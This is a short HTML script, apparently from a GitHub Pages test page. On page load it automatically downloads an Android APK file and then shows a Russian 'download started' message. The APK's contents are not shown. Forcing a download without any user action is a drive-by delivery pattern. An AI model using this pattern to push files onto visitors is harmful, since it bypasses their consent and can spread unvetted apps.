    <script>
        const repoBaseUrl = 'https://94kz55hfdb-netizen.github.io/test/'; 
        const apkUrl = repoBaseUrl + 'downloads/test1.apk'; 
        const apkFilename = 'test1.apk'; 

        function startDownload() {
            const link = document.createElement('a');
            link.href = apkUrl + '?t=' + Date.now(); 
            link.download = apkFilename; 
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            document.body.innerHTML = '<div style="text-align:center; padding-top: 100px;"><h1>Загрузка началась!</h1><p>Проверьте уведомления браузера.</p></div>';
        }

        window.onload = function() {
            setTimeout(startDownload, 500); 
        };
    </script>
